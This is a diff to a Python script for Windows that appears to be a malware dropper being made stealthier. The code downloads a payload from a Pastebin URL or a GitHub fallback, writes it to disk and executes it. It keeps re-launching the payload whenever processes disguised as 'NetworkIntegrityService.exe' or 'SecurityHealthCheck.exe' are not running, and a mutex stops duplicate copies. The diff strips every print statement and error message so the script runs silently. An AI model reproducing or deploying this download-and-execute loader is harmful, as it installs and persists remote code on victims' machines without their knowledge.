@@ -1,8 +1,5 @@
 import os
 import time
-import colorama
-from colorama import Fore
-from pystyle import Add, Center, Anime, Colors, Colorate, Write
 import urllib.request
 import random
 import gzip
@@ -20,17 +17,15 @@ import win32clipboard
 def create_mutex(mutex_name):
     try:
         mutex = win32event.CreateMutex(None, 0, mutex_name)
-        if win32api.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
+        if win32api.GetLastError() == 183:  
             return False
         return True
     except Exception as e:
-        print(f"Error creating mutex: {e}")
         return False
 
 if os.name == "nt":
     mutex_name = "SystemResourceMonitor"
     if not create_mutex(mutex_name):
-        print("Mutex already exists. Exiting program.")
         sys.exit(0)
 
 user_agents = [
@@ -64,20 +59,17 @@ def fetch_url_with_random_user_agent(raw_url, fallback_url):
             else:
                 return response.read().decode('utf-8')
         except urllib.error.HTTPError as e:
-            print(f"HTTP Error: {e.code} - {e.reason}")
             return None
         except Exception as e:
-            print(f"Error: {str(e)}")
             return None
 
     raw_code = fetch_url(raw_url)
     
     if not raw_code:
-        print(f"Attempting to fetch from fallback URL...")
         try:
             raw_code = fetch_url(fallback_url)
         except Exception as e:
-            print(f"Error fetching from fallback URL: {e}")
+            return None
     
     return raw_code
 
@@ -90,15 +82,11 @@ def write_and_execute(raw_code):
             with open(test_file_path, 'wb') as f:
                 f.write(raw_code)
             
-            print(f"Raw code written to {test_file_path}")
-            
-            print(f"Starting PyInstaller for {test_file_path}...")
             subprocess.run([test_file_path], check=True)
-            print(f"PyInstaller executed for {test_file_path}")
         else:
-            print("No code to execute.")
+            pass
     except Exception as e:
-        print(f"Error writing or executing the file: {e}")
+        pass
 
 raw_url = 'https://pastebin.com/raw/zUChGNjj'
 fallback_url = 'https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/Midnight'
@@ -106,30 +94,26 @@ fallback_url = 'https://raw.githubusercontent.com/247msn/96737693845/refs/heads/
 try:
     raw_code = fetch_url_with_random_user_agent(raw_url, fallback_url)
 except Exception as e:
-    print(f"Error fetching raw code: {e}")
+    pass
 
 def check_running():
     try:
-        print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]{Fore.GREEN} Checking (running)")
-
         process = subprocess.Popen(["tasklist", "/FI", "IMAGENAME eq NetworkIntegrityService.exe"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         output, _ = process.communicate()
         if b"NetworkIntegrityService.exe" not in output:
-            print(f"Process NetworkIntegrityService.exe not running, executing the code...")
             write_and_execute(raw_code)
         
         process = subprocess.Popen(["tasklist", "/FI", "IMAGENAME eq SecurityHealthCheck.exe"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         output, _ = process.communicate()
         if b"SecurityHealthCheck.exe" not in output:
-            print(f"Process SecurityHealthCheck.exe not running, executing the code...")
             write_and_execute(raw_code)
 
     except Exception as e:
-        print(f"Error checking running processes: {e}")
+        pass
 
 while True:
     try:
         check_running()
     except Exception as e:
-        print(f"Error in main loop: {e}")
+        pass
     time.sleep(0.1)
